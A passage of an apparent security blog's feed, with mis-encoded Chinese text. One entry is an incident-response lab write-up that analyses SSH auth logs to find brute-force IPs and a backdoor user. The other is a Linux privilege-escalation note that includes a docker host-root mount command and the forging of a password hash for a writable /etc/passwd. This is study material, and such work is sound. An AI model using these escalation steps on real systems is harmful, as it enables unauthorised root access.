class="hljs-built_in">uniq</span> -c | <span class="hljs-built_in">sort</span> -nr | more<br></code></pre></td></tr></table></figure><p>å‘½ä»¤è§£é‡Šï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">cat /var/log/auth.log.1ï¼šcat å‘½ä»¤ç”¨äºè¿æ¥æ–‡ä»¶å¹¶æ‰“å°åˆ°æ ‡å‡†è¾“å‡ºè®¾å¤‡ï¼Œè¿™é‡Œæ˜¯ç”¨æ¥æ˜¾ç¤º /var/log/auth.log.1 æ–‡ä»¶çš„å†…å®¹ã€‚<br><br>grep -a &quot;Failed password for root&quot;ï¼šgrep å‘½ä»¤ç”¨äºæœç´¢åŒ…å«ç‰¹å®šæ–‡æœ¬çš„è¡Œã€‚è¿™é‡Œæœç´¢çš„æ˜¯åŒ…å«æ–‡æœ¬ &quot;Failed password for root&quot; çš„è¡Œï¼Œè¡¨ç¤º root ç”¨æˆ·ç™»å½•å¤±è´¥çš„äº‹ä»¶ã€‚-a é€‰é¡¹æ˜¯å‘Šè¯‰ grep ä»¥æ–‡æœ¬æ–‡ä»¶çš„æ–¹å¼å¤„ç†äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä¿è¯è¾“å‡ºçš„ä¸€è‡´æ€§ã€‚<br><br>awk &#x27;&#123;print $11&#125;&#x27;ï¼šawk æ˜¯ä¸€ä¸ªå¼ºå¤§çš„æ–‡æœ¬å¤„ç†å·¥å…·ã€‚è¿™é‡Œ &#123;print $11&#125; è¡¨ç¤ºæ‰“å°æ¯è¡Œçš„ç¬¬11ä¸ªå­—æ®µã€‚åœ¨ auth.log ä¸­ï¼Œç¬¬11ä¸ªå­—æ®µé€šå¸¸æ˜¯ç™»å½•å¤±è´¥æ—¶å°è¯•ä½¿ç”¨çš„ç”¨æˆ·åã€‚<br><br>sortï¼šsort å‘½ä»¤å¯¹è¾“å…¥çš„è¡Œè¿›è¡Œæ’åºã€‚ç”±äºå‰é¢ awk è¾“å‡ºçš„æ˜¯ root ç”¨æˆ·çš„ç™»å½•å¤±è´¥è¡Œï¼Œè¿™é‡Œçš„ sort å°†è¿™äº›è¡Œè¿›è¡Œå­—å…¸åºæ’åºã€‚<br><br>uniq -cï¼šuniq å‘½ä»¤ç”¨äºè¿‡æ»¤æ‰æ’åºåçš„é‡å¤è¡Œã€‚-c é€‰é¡¹è¡¨ç¤ºåœ¨æ¯è¡Œå‰æ˜¾ç¤ºè¯¥è¡Œåœ¨æ–‡ä»¶ä¸­å‡ºç°çš„æ¬¡æ•°ã€‚<br><br>sort -nrï¼šå†æ¬¡ä½¿ç”¨ sort å‘½ä»¤ï¼Œ-n é€‰é¡¹è¡¨ç¤ºæŒ‰ç…§æ•°å€¼æ’åºï¼Œ-r é€‰é¡¹è¡¨ç¤ºé™åºæ’åºã€‚è¿™é‡Œå¯¹ uniq å‘½ä»¤çš„è¾“å‡ºç»“æœæŒ‰å‡ºç°æ¬¡æ•°è¿›è¡Œé™åºæ’åºã€‚<br><br>moreï¼šmore å‘½ä»¤ç”¨äºåˆ†é¡µæ˜¾ç¤ºè¾“å‡ºç»“æœï¼Œå…è®¸ç”¨æˆ·é€æ­¥æŸ¥çœ‹é•¿è¾“å‡ºï¼Œè€Œä¸æ˜¯ä¸€æ¬¡æ€§æ˜¾ç¤ºæ‰€æœ‰å†…å®¹ã€‚<br></code></pre></td></tr></table></figure><p>å¯ä»¥æ‰¾åˆ°3ä¸ªip</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">192.168.200.2<br>192.168.200.32<br>192.168.200.31<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151645948.png" alt="image-20240709183107694"></p><p>çˆ†ç ´æˆåŠŸçš„ç”¨æˆ·å°±å»æŸ¥â€Acceptedâ€çš„å­—æ®µ</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /var/log/auth.log.1 | grep -a <span class="hljs-string">&quot;Accepted&quot;</span> | awk <span class="hljs-string">&#x27;&#123;print $11&#125;&#x27;</span> | <span class="hljs-built_in">sort</span> | <span class="hljs-built_in">uniq</span> -c | <span class="hljs-built_in">sort</span> -nr | more<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151645949.png" alt="image-20240709183249678"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">192.168.200.2<br></code></pre></td></tr></table></figure><p>çˆ†ç ´ç”¨æˆ·å‘½çš„å­—å…¸å°±æŸ¥â€Failed passwordâ€å­—æ®µ</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs BASH"><span class="hljs-built_in">cat</span> /var/log/auth.log.1 | grep -a <span class="hljs-string">&quot;Failed password&quot;</span> |perl -e <span class="hljs-string">&#x27;while($_=&lt;&gt;)&#123; /for(.*?) from/; print &quot;$1\n&quot;;&#125;&#x27;</span>|<span class="hljs-built_in">uniq</span> -c|<span class="hljs-built_in">sort</span> -nr<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151645950.png" alt="image-20240709183507195"></p><p>æŸ¥æ‰¾ç™»å½•æˆåŠŸç™»é™†çš„ipä¸€å…±çˆ†ç ´äº†å¤šå°‘æ¬¡ï¼Œå°±æŸ¥çœ‹â€Failed password for rootâ€å­—æ®µï¼Œä¹Ÿå°±æ˜¯ç¬¬ä¸€ä¸ªçš„æŸ¥è¯¢ï¼Œå‰é¢çš„æ•°å­—å°±æ˜¯ç™»é™†æ¬¡æ•°</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /var/log/auth.log.1 | grep -a <span class="hljs-string">&quot;Failed password for root&quot;</span> | awk <span class="hljs-string">&#x27;&#123;print $11&#125;&#x27;</span> | <span class="hljs-built_in">sort</span> | <span class="hljs-built_in">uniq</span> -c | <span class="hljs-built_in">sort</span> -nr | more<br></code></pre></td></tr></table></figure><p>åé—¨ç”¨æˆ·å°±æŸ¥â€new userâ€å­—æ®µ</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /var/log/auth.log.1 |grep -a <span class="hljs-string">&quot;new user&quot;</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151645951.png" alt="image-20240709183835955"></p><p>ä¹Ÿå¯ä»¥ç›´æ¥çœ‹&#x2F;etc&#x2F;passwdçš„å†…å®¹</p><p><img src="http://cdn.clown2024.cn/202407151645952.png" alt="image-20240709183913790"></p><p>åé—¨ç”¨æˆ·æ˜¯test2</p><p><strong>æ¥è¡¥å……ä¸€ä¸‹æ—¥å¿—ç›¸å…³çš„çŸ¥è¯†</strong></p><p>å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼š<a href="https://developer.aliyun.com/article/1477704">https://developer.aliyun.com/article/1477704</a></p><p>ä¸Šé¢æŸ¥è¯¢çš„å­—æ®µæ˜¯æ—¥å¿—çš„çº§åˆ«ä¿¡æ¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Invalid user è¡¨ç¤ºå°è¯•ä½¿ç”¨äº†ä¸€ä¸ªä¸å­˜åœ¨çš„ç”¨æˆ·ç™»å½•ç³»ç»Ÿã€‚<br>Failed password è¡¨ç¤ºä¸ºæŸä¸ªç”¨æˆ·è¾“å…¥äº†é”™è¯¯çš„å¯†ç ã€‚<br>authentication failure è¡¨ç¤ºè®¤è¯å¤±è´¥ã€‚<br>Connection closed è¡¨ç¤ºè¿æ¥è¢«å…³é—­ã€‚<br>Accepted password è¡¨ç¤ºå¯†ç è®¤è¯æˆåŠŸã€‚<br>new user æˆ– new group è¡¨ç¤ºåˆ›å»ºäº†æ–°ç”¨æˆ·æˆ–æ–°ç”¨æˆ·ç»„ã€‚<br>password changed è¡¨ç¤ºç”¨æˆ·å¯†ç è¢«æ›´æ”¹ã€‚<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;linuxå…¥ä¾µæ’æŸ¥&quot;&gt;&lt;a href=&quot;#Linuxå…¥ä¾µæ’æŸ¥&quot; class=&quot;headerlink&quot; title=&quot;Linuxå…¥ä¾µæ’æŸ¥&quot;&gt;&lt;/a&gt;Linuxå…¥ä¾µæ’æŸ¥&lt;/h1&gt;&lt;p&gt;è¿™æ˜¯é¶æœºçš„ç®€ä»‹&lt;/p&gt;
&lt;figure class=&quot;highlight plain</summary>
      
    
    
    
    <category term="åº”æ€¥å“åº”wp" scheme="https://clowsman.github.io/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94wp/"/>
    
    
    <category term="åº”æ€¥å“åº”" scheme="https://clowsman.github.io/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>Linuxææƒ-ä¸å®‰å…¨é…ç½®é¡¹</title>
    <link href="https://clowsman.github.io/2024/07/01/Linux%E6%8F%90%E6%9D%83-%E4%B8%8D%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE%E9%A1%B9/"/>
    <id>https://clowsman.github.io/2024/07/01/Linux%E6%8F%90%E6%9D%83-%E4%B8%8D%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE%E9%A1%B9/</id>
    <published>2024-07-01T05:26:22.000Z</published>
    <updated>2024-08-05T15:42:00.397Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ä¸å®‰å…¨çš„ç”¨æˆ·ç»„"><a href="#ä¸å®‰å…¨çš„ç”¨æˆ·ç»„" class="headerlink" title="ä¸å®‰å…¨çš„ç”¨æˆ·ç»„"></a>ä¸å®‰å…¨çš„ç”¨æˆ·ç»„</h1><p><strong>diskç”¨æˆ·ç»„</strong></p><p>diskç”¨æˆ·ç»„æ˜¯Linuxä¸­ä¸€ä¸ªç‰¹æ®Šçš„ç”¨æˆ·ç»„ï¼Œç»„å†…æˆå‘˜å¯ä»¥å¯¹ä¸€äº›å—è®¾å¤‡(æ¯”å¦‚ç¡¬ç›˜ã€CDç­‰)è¿›è¡Œè¯»å†™ã€‚å¦‚æœå±äºdiskç”¨æˆ·ç»„ï¼Œå°±å¯ä»¥æ‰“å¼€Linuxçš„å†…ç½®å·¥å…·debugfsçš„äº¤äº’å¼å‘½ä»¤è¡Œï¼Œå¹¶å¯ä»¥æŒ‚è½½åˆ°æ–‡ä»¶ç³»ç»Ÿæ¥è°ƒè¯•æ–‡ä»¶</p><p>å…ˆdfå‘½ä»¤æŸ¥çœ‹æ–‡ä»¶ç³»ç»Ÿç£ç›˜ä¿¡æ¯</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">df</span><br></code></pre></td></tr></table></figure><p>å‡è®¾å½“å‰çš„ç›®å½•åˆ†åŒºä¸º&#x2F;dev&#x2F;sda2ï¼Œç„¶ådebugfsæ‰“å¼€äº¤äº’å¼å‘½ä»¤è¡Œ</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">debugfs /dev/sda2<br></code></pre></td></tr></table></figure><p>è¿™æ—¶å°±å¯ä»¥å¯¹æ–‡ä»¶ç³»ç»Ÿè¿›è¡Œè°ƒè¯•</p><p><strong>admç”¨æˆ·ç»„</strong></p><p>æ­¤ç»„çš„æˆå‘˜é€šå¸¸æ‹¥æœ‰è¯»å–å’Œå†™å…¥ç³»ç»Ÿæ—¥å¿—æ–‡ä»¶ã€æŸ¥çœ‹ç³»ç»Ÿæ€§èƒ½æŒ‡æ ‡ä»¥åŠæ‰§è¡Œå…¶ä»–ç³»ç»Ÿç®¡ç†ä»»åŠ¡çš„æƒé™ã€‚å¯ä»¥æŸ¥çœ‹&#x2F;var&#x2F;logä¸‹çš„ç›®å½•ç³»ç»Ÿæ•æ„Ÿæ—¥å¿—</p><p><strong>shadowç”¨æˆ·ç»„</strong></p><p>&#x2F;etc&#x2F;shadowç”¨äºå­˜å‚¨ç”¨æˆ·å¯†ç ï¼Œé™¤äº†rootç”¨æˆ·ï¼Œè¿˜æœ‰shadowç”¨æˆ·ç»„æˆå‘˜ä¹Ÿå¯ä»¥æŸ¥çœ‹è¯¥æ–‡ä»¶ã€‚</p><p><strong>lxdç”¨æˆ·ç»„</strong></p><p>æ”¹ç»„æˆå‘˜å¯ä»¥ä½¿ç”¨Linuxå®¹å™¨(LXD)ã€‚</p><p>Linuxå®¹å™¨æ˜¯ä¸€ç§è½»é‡çº§çš„è™šæ‹ŸåŒ–æŠ€æœ¯ï¼Œèƒ½å¤Ÿåœ¨å•ä¸ªLinuxç³»ç»Ÿä¸Šè¿è¡Œå¤šä¸ªç‹¬ç«‹çš„Linuxå®ä¾‹ã€‚</p><p>ç”¨æˆ·æ‰€å±è¯¥ç»„æ—¶ï¼Œå¯ä»¥ä½¿ç”¨lxcå‘½ä»¤åˆ›å»ºæ–°å®¹å™¨ï¼Œç„¶åå°†å®¿ä¸»æœºçš„æ–‡ä»¶ç³»ç»ŸæŒ‚è½½è‡³å®¹å™¨ä¸­ï¼Œå³å¯æŸ¥çœ‹å®¿ä¸»æœºçš„æ•æ„Ÿæ–‡ä»¶ç­‰æ“ä½œ</p><p><strong>Dockerç”¨æˆ·ç»„</strong></p><p>Linuxå®‰è£…å®Œdockerä¹‹åä¼šåˆ›å»ºä¸€ä¸ªåä¸ºdockerçš„ç”¨æˆ·ç»„ã€‚å¦‚æœå±äºè¿™ä¸ªç»„æˆ–è€…æ˜¯rootç”¨æˆ·å°±å¯ä»¥ä½¿ç”¨dockerå‘½ä»¤å°è¯•ææƒ</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">docker run -v /:/mnt -it alpine <span class="hljs-comment">#è¯¥å‘½ä»¤ç”¨äºå°†å®¿ä¸»æœºçš„æ ¹ç›®å½•æŒ‚è½½åˆ°å®¹å™¨çš„/mntç›®å½•ä¸‹</span><br><span class="hljs-comment"># æ‰§è¡Œè¿™æ¡å‘½ä»¤æ—¶ï¼Œdockeræ£€æŸ¥æ˜¯å¦å­˜åœ¨alpineé•œåƒï¼Œä¸å­˜åœ¨ä¼šä»docker hubä¸­ä¸‹è½½ï¼Œç„¶åä»¥è¯¥é•œåƒä½œä¸ºåŸºç¡€</span><br></code></pre></td></tr></table></figure><p>ç„¶åå°±å¯ä»¥åœ¨å®¹å™¨ä¸­è®¿é—®å®¿ä¸»æœºçš„ç³»ç»Ÿæ–‡ä»¶äº†</p><h1 id="ä¸å®‰å…¨çš„è¯»å†™æƒé™"><a href="#ä¸å®‰å…¨çš„è¯»å†™æƒé™" class="headerlink" title="ä¸å®‰å…¨çš„è¯»å†™æƒé™"></a>ä¸å®‰å…¨çš„è¯»å†™æƒé™</h1><p><strong>å¯å†™çš„&#x2F;etc&#x2F;passwdæ–‡ä»¶</strong></p><p>æŸ¥çœ‹&#x2F;etc&#x2F;passwdçš„ä¿¡æ¯</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> -lh /etc/passwd<br></code></pre></td></tr></table></figure><p>å¦‚æœå­˜åœ¨ä»»æ„ç”¨æˆ·å¯ä»¥è¯»å†™çš„æƒ…å†µï¼Œå°±å¯ä»¥ç”Ÿæˆç”¨æˆ·ä¿¡æ¯æ·»åŠ åˆ°è¯¥æ–‡ä»¶ä¸­</p><p>æ‰§è¡Œä¸‹é¢å‘½ä»¤ç”Ÿæˆå¸¦ç›å¯†ç </p><figure class="highlight perl"><table><tr><td class="code"><pre><code class="hljs perl">perl -le <span class="hljs-string">&#x27;print crypt(&quot;123456&quot;,&quot;suiyi&quot;)&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>å¯è¯»çš„&#x2F;etc&#x2F;shadowæ–‡ä»¶</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ä¸å®‰å…¨çš„ç”¨æˆ·ç»„&quot;&gt;&lt;a href=&quot;#ä¸å®‰å…¨çš„ç”¨æˆ·ç»„&quot; class=&quot;headerlink&quot; title=&quot;ä¸å®‰å…¨çš„ç”¨æˆ·ç»„&quot;&gt;&lt;/a&gt;ä¸å®‰å…¨çš„ç”¨æˆ·ç»„&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;diskç”¨æˆ·ç»„&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;diskç”¨æˆ·ç»„æ˜¯Linuxä¸­ä¸€ä¸ªç‰¹æ®Š</summary>
      
    
    
    
    <category term="Linuxææƒ" scheme="https://clowsman.github.io/categories/Linux%E6%8F%90%E6%9D%83/"/>
    
    
    <category term="Linuxææƒ" scheme="https://clowsman.github.io/tags/Linux%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
</feed>
